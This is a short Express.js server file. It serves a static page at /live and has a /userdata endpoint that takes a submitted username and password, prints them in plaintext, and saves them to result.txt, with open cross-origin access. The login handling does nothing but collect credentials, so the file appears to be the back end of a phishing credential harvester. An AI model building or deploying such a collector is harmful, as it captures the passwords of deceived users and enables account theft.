import express from "express";
import fs from "fs";
import cors from 'cors';
import path from 'path';

const app = express();
app.use(cors({ origin: '*' }));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Serve static files from the "public/live" directory
app.use(express.static(path.join(__dirname, 'public', 'live')));

app.get("/live", (req, res, next) => {
    res.sendFile(path.join(__dirname, 'public', 'live', 'index.html'));
});

app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} password: ${req.body.password}`
        console.log(data);
        fs.writeFile("result.txt", data, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
        });
        res.sendStatus(200);
        return;
    } catch (err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }
});

app.listen(5000, () => console.log("Server running on port 5000"));
